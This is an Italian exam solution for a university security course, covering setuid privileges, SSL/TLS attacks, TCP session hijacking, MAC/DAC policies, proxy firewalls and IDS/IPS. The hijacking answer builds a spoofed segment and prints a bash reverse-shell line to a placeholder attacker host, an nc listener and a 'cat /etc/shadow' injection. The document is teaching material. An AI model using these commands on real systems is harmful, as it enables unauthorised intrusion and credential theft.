# Soluzione Appello di Sicurezza – SSRI — Teoria — 13/06/2025

**Docenti: S. Cimato – V. Anisetti** · Esame da 6 CFU (rispondere a tutte le domande)

Per ogni domanda sono indicati i riferimenti alle lezioni di teoria, l'inquadramento e lo svolgimento discorsivo completo.

---

## Traccia originale dell'appello

**Cognome:**  
**Nome:**  
**Matricola:**

**Sicurezza - SSRI**

**Docenti:** S. Cimato – V. Anisetti  
**Appello del 13/06/2025**

Non è ammesso alcun materiale per la consultazione. Buon lavoro!

- **Esame da 6 CFU:** Rispondere a tutte le domande

### **1. Set-UID Privileged Programs**

a. Ogni processo Unix è associato con un real user ID (RUID) e un effective user ID (EUID). Spiegare la differenza fra RUID e EUID e l'utilizzo del bit setuid e le implicazioni per la sicurezza.

b. Si consideri il seguente programma:

```c
// setuid_file.c
#include<stdio.h>
int main(void)
{
        int uid;
        uid=getuid();
        printf("RUID : getuid() : %d \n",uid);
        uid=geteuid();
        printf("EUID : geteuid() : %d \n",uid);

        system("whoami");
        system("cat /etc/sudoers");//only root has access to this file
}
```

Supponendo che si compili il programma con `gcc setuid_file.c -o euid_zero` e successivamente si dia il comando `chmod ug+s euid_zero`, se l'utente `kali` con attributi `uid=1000(kali) gid=1000(kali) groups=1000(kali)`, manda in esecuzione con `./euid_zero`, cosa viene stampato?

### **2. Attacks**

a. Descrivere le problematiche di sicurezza del protocollo SSL.

### **3. TCP attacks**

a. Descrivere in dettaglio in cosa consiste il TCP hijacking attack, facendo un esempio nel caso l'attaccante abbia intercettato la conversazione tra client e server qui raffigurata.

<!-- INSERT INSTRUCTOR SLIDE/DIAGRAM HERE -->

i. Definire in dettaglio il pacchetto da spedire per portare a termine l'attacco.

ii. Nel caso si voglia far eseguire un comando al server come si può procedere?

### **4. Politiche di sicurezza**

a. Definire l'utilizzo delle politiche di sicurezza basate su MAC e DAC.

b. Fare cenni sull'utilizzo di tali politiche nei sistemi operativi moderni.

### **5. Firewall e NIDS**

a. Descrivere come funziona un proxy firewall.

b. Differenza tra IDS e IPS.

---

## Domanda 1 — Set-UID Privileged Programs

> **Riferimenti di teoria**:
>
> - [M3/UD4/L1 — Set-UID, RUID-EUID e attacchi via variabili d'ambiente](../../M3/UD4_Approfondimenti_Esame/L1%20-%20Set-UID,%20RUID-EUID%20e%20attacchi%20via%20variabili%20d'ambiente.md) (§2 RUID/EUID, §5 output getuid/geteuid, §5.1 proprietario non root)
> - [M3/UD3/L2 — Controllo degli accessi in Linux](../../M3/UD3/L2%20-%20Controllo%20degli%20accessi%20in%20Linux.md) (§6-7)

**(a) Differenza RUID/EUID e implicazioni del bit setuid.** Il *Real User ID* è l'identità dell'utente che ha **lanciato** il processo e non cambia durante l'esecuzione: racconta *chi* sta usando il programma. L'*Effective User ID* è invece l'identità che il kernel usa nei **controlli di accesso**, cioè quella che determina cosa il processo può effettivamente fare. Normalmente RUID ed EUID coincidono. Il **bit setuid** rompe questa coincidenza: se attivo su un eseguibile, all'atto della `exec()` il kernel pone l'EUID pari allo **UID del proprietario del file**, lasciando invariato il RUID. Il programma gira così, per la durata dell'esecuzione, con i privilegi del proprietario. L'implicazione di sicurezza è duplice: da un lato il meccanismo è indispensabile per operazioni come `passwd` (che deve scrivere `/etc/shadow` pur essendo invocato da utenti comuni); dall'altro, un binario setuid **di proprietà di root** è codice root eseguibile da chiunque, e ogni suo difetto (invocazione di shell, fiducia in `PATH`/`LD_*`, input non validato) diventa una via di *privilege escalation*. Il presupposto spesso trascurato è che il setuid conferisce i privilegi **del proprietario del file**: se il proprietario non è root, non si ottiene alcun privilegio aggiuntivo.

**(b) Output del programma `setuid_file.c`.** Il programma stampa RUID ed EUID, poi esegue `system("whoami")` e `system("cat /etc/sudoers")`. La sequenza data è:

```
gcc setuid_file.c -o euid_zero      # il binario è di proprietà di kali (uid 1000)
chmod ug+s euid_zero                # attiva setuid + setgid
```

Il punto decisivo è che **non c'è alcun `chown root`**: il binario resta di proprietà di `kali`, quindi `chmod ug+s` fissa l'EUID/EGID a `kali` stesso. Il setuid, in questo caso, **non eleva nulla**. Lanciandolo come `kali` si ottiene:

```
RUID : getuid()  : 1000
EUID : geteuid() : 1000
kali                                  ← output di whoami
cat: /etc/sudoers: Permission denied  ← EUID 1000 non può leggere il file di root
```

RUID ed EUID valgono entrambi 1000 perché il proprietario è `kali`; `whoami` stampa `kali` perché riflette l'EUID; e `cat /etc/sudoers` fallisce con *Permission denied*, dato che quel file è leggibile solo da root e l'EUID è 1000. Il nome `euid_zero` è deliberatamente ingannevole: l'EUID diventerebbe 0 **soltanto** se il binario fosse prima passato a root con `sudo chown root euid_zero` (come avviene nell'appello del 12/09). Senza quel passaggio, il setuid punta all'utente non privilegiato e la lettura fallisce — ed è esattamente ciò che la domanda vuole far notare.

---

## Domanda 2 — Attacks: problematiche di sicurezza di SSL

> **Riferimenti di teoria**:
>
> - [M4/UD4/L4 — Attacchi a SSL e TLS](../../M4/UD4/L4%20-%20Attacchi%20a%20SSL%20e%20TLS.md) (version/cipher rollback, MD5, export 40 bit, RNG Debian)
> - [M4/UD4/L7 — Attacchi Heartbleed e BEAST](../../M4/UD4/L7%20-%20Attacchi%20Heartbleed%20e%20BEAST.md)
> - [M4/UD4/L6 — Attacchi sui Certificati SSL TLS](../../M4/UD4/L6%20-%20Attacchi%20sui%20Certificati%20SSL%20TLS.md)

Le problematiche di sicurezza di SSL/TLS si possono raggruppare in quattro famiglie. La prima è quella dei **downgrade / rollback di protocollo**: un attaccante *man-in-the-middle* intercetta la fase di negoziazione e la altera per costringere le parti a usare una versione o una cipher suite più debole di quelle che supporterebbero. Nel *version rollback* un client che propone SSL 3.0 viene fatto ripiegare su SSL 2.0, versione priva dei messaggi *Finished* che sigillano l'handshake, così che la manipolazione passi inosservata; nel *cipher suite rollback* di SSL 2.0, non essendo autenticate le preferenze crittografiche, si forza un algoritmo debole. A questo si legano le **debolezze intrinseche delle vecchie versioni**: SSL 2.0 usava MD5 per l'autenticazione dei messaggi (vulnerabile a collisioni), ammetteva la modalità *export* con chiavi di soli 40 bit e non autenticava il padding usato nel calcolo del MAC, permettendo di rimuovere byte senza essere scoperti.

La seconda famiglia riguarda le **debolezze delle modalità crittografiche**. L'attacco **BEAST** (2011) sfrutta il fatto che TLS 1.0, in modalità CBC, riutilizza l'ultimo blocco cifrato del record precedente come vettore di inizializzazione del successivo: rendendo l'IV prevedibile, un attaccante MITM può, iniettando testo controllato e confrontando i cifrati, indovinare byte per byte dati sensibili come i cookie di sessione. Sulla stessa linea, gli attacchi **CRIME/BREACH** sfruttano la compressione TLS correlando la lunghezza del testo compresso al contenuto in chiaro — motivo per cui TLS 1.3 ha proibito del tutto la compressione e le modalità non-AEAD.

La terza famiglia è quella dei **difetti di implementazione**, indipendenti dalla solidità degli algoritmi. Il caso **Heartbleed** (2014) è emblematico: un mancato controllo di lunghezza nell'estensione *Heartbeat* di OpenSSL consentiva a un client di farsi restituire fino a 64 KB di memoria del server per ogni richiesta, memoria che poteva contenere password, cookie e persino la chiave privata TLS. Il **bug del generatore casuale di Debian** (2006-2008) è l'altro estremo: una riga rimossa per errore riduceva l'entropia al solo PID, limitando lo spazio delle chiavi a 32768 valori e rendendo prevedibili chiavi TLS, SSH e certificati.

La quarta famiglia riguarda la **fiducia nei certificati e nella PKI**: certificati emessi da CA compromesse o mal validate, catene di certificati accettate senza controlli rigorosi, algoritmi di firma deboli. Anche un canale crittograficamente perfetto è inutile se il client accetta il certificato dell'attaccante come autentico. La lezione complessiva è che la sicurezza di SSL/TLS dipende non solo dalla robustezza matematica, ma anche dalla correttezza dell'implementazione, dall'aggiornamento tempestivo dei protocolli e dalla solidità del sistema di fiducia dei certificati — ed è per questo che TLS 1.3 ha ripulito il protocollo eliminando versioni, cifrari e funzioni ormai insicuri.

---

## Domanda 3 — TCP hijacking attack

> **Riferimenti di teoria**:
>
> - [M4/UD5/L1 — TCP Session Hijacking e Reset Attack](../../M4/UD5_Approfondimenti_Esame/L1%20-%20TCP%20Session%20Hijacking%20e%20Reset%20Attack.md) (§2 hijacking, §2.3 iniezione comandi e reverse shell)
> - [M4/UD2/L3 — IP Spoofing](../../M4/UD2/L3%20-%20IP%20Spoofing.md) (predizione/lettura dei numeri di sequenza)
> - [M4/UD2/L4 — ACK Storm](../../M4/UD2/L4%20-%20Attacchi%20TCP%20%E2%80%93%20ACK%20Storm.md) (desincronizzazione conseguente)

**Descrizione dell'attacco.** Nel *TCP session hijacking* l'attaccante si inserisce in una connessione TCP **già stabilita e autenticata** iniettando un segmento che impersona uno dei due estremi. TCP non autentica il mittente: accetta un segmento se la quaterna `(IP:porta sorgente, IP:porta destinazione)` corrisponde a una connessione attiva e se il numero di sequenza cade nella finestra di ricezione. Chi ha intercettato la conversazione (tipicamente dopo un ARP poisoning che lo pone come MITM) **legge direttamente** SEQ e ACK dai pacchetti e può quindi fabbricare un segmento che i due estremi accetteranno come legittimo, sfruttando l'autenticazione già avvenuta senza conoscere alcuna password.

**(i) Il pacchetto da spedire.** Nella cattura, System A `192.168.0.100` invia a System B `192.168.0.200` un segmento con `SEQ = 1429775000`, `ACK = 1250510000` e `len = 24`; B risponde con `SEQ = 1250510000`, `ACK = 1429775024`, `len = 167`. Per iniettare dati **verso il server B** occorre impersonare A. Il numero di sequenza da usare è quello che **B si aspetta** dal client: B ha ackato `1429775024`, dunque attende il byte `1429775024` (coerente con `1429775000 + 24`). L'acknowledgment deve confermare i dati ricevuti da B, cioè `1250510000 + 167 = 1250510167`. Il segmento è quindi:

```
IP:  src = 192.168.0.100 (spoofed)   dst = 192.168.0.200
TCP: src port = <porta di A>          dst port = <porta di B>
     SEQ   = 1429775024               (= rcv_nxt di B = ACK inviato da B)
     ACK   = 1250510167               (= SEQ di B + 167)
     Flags = PSH, ACK
     Payload = <dati / comando iniettato>
```

I due controlli di coerenza tornano — `SEQ (1429775024) = ACK di B` e `ACK (1250510167) = SEQ di B + len` — quindi il segmento ricade nella finestra e viene consegnato all'applicazione di B.

**(ii) Far eseguire un comando al server.** Se B ospita una sessione interattiva (Telnet, rlogin o una shell remota), i byte iniettati vengono passati alla shell del server **come se li avesse digitati A**: basta quindi che il payload contenga il comando seguito da un ritorno a capo perché la shell lo esegua (ad esempio `"\r cat /etc/shadow \r"`). C'è però una conseguenza da gestire: dopo l'iniezione i numeri di sequenza di A e B non combaciano più (B ha consumato byte che A non ha mai inviato), la connessione si **desincronizza** e degenera in un ACK storm. Per questo, invece di un singolo comando, conviene iniettare una **reverse shell** che restituisca il controllo in modo persistente:

```
\n /bin/bash -i > /dev/tcp/ATTACCANTE/9090 0<&1 2>&1 \n
```

avendo prima messo in ascolto `nc -lvp 9090` sulla macchina dell'attaccante. Così, anche quando la sessione originale collassa, l'attaccante conserva una shell interattiva su B con i privilegi della sessione dirottata. La difesa fondamentale è la cifratura autenticata end-to-end (SSH sostituisce Telnet/rlogin), che rende inaccettabili i segmenti falsi e nasconde SEQ/ACK allo sniffer.

---

## Domanda 4 — Politiche di sicurezza MAC e DAC

> **Riferimenti di teoria**:
>
> - [M3/UD2/L2 — Politiche di controllo degli accessi – MAC](../../M3/UD2/L2%20-%20Politiche%20di%20controllo%20degli%20accessi%20%E2%80%93%20MAC.md)
> - [M3/UD2/L3 — Politiche di controllo degli accessi – DAC](../../M3/UD2/L3%20-%20Politiche%20di%20controllo%20degli%20accessi%20%E2%80%93%20DAC.md)
> - [M3/UD3/L1 — Windows](../../M3/UD3/L1%20-%20Controllo%20degli%20accessi%20in%20Windows.md) · [M3/UD3/L2 — Linux](../../M3/UD3/L2%20-%20Controllo%20degli%20accessi%20in%20Linux.md)

**(a) Utilizzo di MAC e DAC.** La differenza sta in **chi controlla i permessi**. Nel **DAC (Discretionary Access Control)** il proprietario di una risorsa decide *a propria discrezione* chi può accedervi e con quali diritti: è il modello dei permessi UNIX (`rwx`) e delle DACL di Windows, pensato per ambienti in cui flessibilità e condivisione contano più del rigore assoluto. Il suo limite è la propagazione incontrollata dei privilegi: un utente — o un processo malevolo che agisce con la sua identità — può ridistribuire liberamente gli accessi. Nel **MAC (Mandatory Access Control)** le regole sono invece **imposte dal sistema** tramite etichette di sicurezza associate a soggetti e oggetti, non modificabili nemmeno dal proprietario: l'accesso è concesso solo se l'autorizzazione del soggetto è compatibile con la classificazione dell'oggetto. È il modello degli ambienti militari, governativi e finanziari, dove la riservatezza è prioritaria; garantisce sicurezza molto più alta al prezzo di un'amministrazione complessa e di minore flessibilità.

**(b) Cenni sull'utilizzo nei sistemi operativi moderni.** I SO attuali combinano i due modelli in modo **ibrido**: il DAC resta la modalità operativa quotidiana, mentre uno strato MAC agisce da rete di sicurezza per contenere i danni in caso di compromissione. Su Linux questo strato è **SELinux** (sviluppato dalla NSA e integrato nel kernel dal 2003) o **AppArmor**, che confinano ciascun processo entro profili predefiniti indipendentemente dai permessi discrezionali: anche se un servizio esposto viene bucato, il MAC limita ciò che può toccare. Su Windows, da Vista in poi, il **Mandatory Integrity Control** assegna a processi e oggetti livelli di integrità (basso, medio, alto, sistema), impedendo a un processo di livello inferiore di modificare oggetti di livello superiore — così un'applicazione a bassa integrità (es. un browser) non può alterare file di sistema. In entrambi i casi il MAC copre le lacune del DAC senza rinunciarne alla comodità.

---

## Domanda 5 — Firewall e NIDS

> **Riferimenti di teoria**:
>
> - [M5/UD2/L3 — Proxy](../../M5/UD2/L3%20-%20Proxy.md) (proxy firewall, ALG, bastion host)
> - [M5/UD3/L1 — Intrusion Detection System (IDS)](../../M5/UD3/L1%20-%20Intrusion%20Detection%20System%20%28IDS%29.md)
> - [M5/UD3/L3 — IPS e strumenti avanzati](../../M5/UD3/L3%20-%20IPS%20e%20strumenti%20avanzati.md)

**(a) Come funziona un proxy firewall.** Un proxy firewall è un firewall che, invece di lasciar passare i pacchetti tra client e server, **media la comunicazione interponendosi come intermediario**: il client si connette al proxy, il proxy apre per suo conto una seconda connessione verso il server, e le due sessioni restano fisicamente distinte pur apparendo ai due estremi come una connessione diretta. Non esiste quindi mai una connessione diretta tra interno ed esterno. Nella variante più potente, l'**application-level gateway**, il proxy opera a livello applicativo (Layer 7) con un modulo dedicato per ciascun protocollo (HTTP, FTP, SMTP): può così ispezionare il **contenuto reale** delle comunicazioni e i comandi applicativi, autenticare gli utenti, mascherare gli indirizzi interni, ricomporre i frammenti IP prima di ispezionarli e proteggere da vulnerabilità come i buffer overflow. Il proxy risiede su un **bastion host**, un sistema con OS minimale e rinforzato che rappresenta la prima linea di difesa. Il prezzo di questa profondità di analisi è prestazioni inferiori e la necessità di un proxy dedicato per ogni protocollo, ma la protezione offerta è nettamente superiore a quella dei semplici packet filter.

**(b) Differenza tra IDS e IPS.** Un **IDS (Intrusion Detection System)** è un sistema di **monitoraggio**: osserva il traffico di rete o l'attività di un host per individuare comportamenti anomali o firme di attacco note e, quando li rileva, **segnala** l'evento (allarme, log). È però un osservatore *passivo* rispetto al flusso: rivela l'intrusione ma non la blocca, e non può prevenire un DoS in corso. Un **IPS (Intrusion Prevention System)** è la sua evoluzione *attiva*: oltre a rilevare, **reagisce automaticamente** per interrompere l'attacco — chiudendo la connessione sospetta con l'invio di pacchetti RST a entrambi gli estremi (*session sniping*), aggiornando dinamicamente le regole del firewall per bloccare l'IP sorgente, o scartando in linea i pacchetti malevoli. La differenza chiave è dunque il posizionamento e il potere d'azione: l'IDS sta "di lato" e osserva (spesso su porta mirror), l'IPS sta "in linea" e può fermare il traffico. Il rovescio della medaglia dell'IPS è il rischio: una reazione errata su un falso positivo — magari innescata ad arte con IP spoofati — può isolare utenti legittimi e provocare un denial of service auto-inflitto, per cui va calibrato con cura.
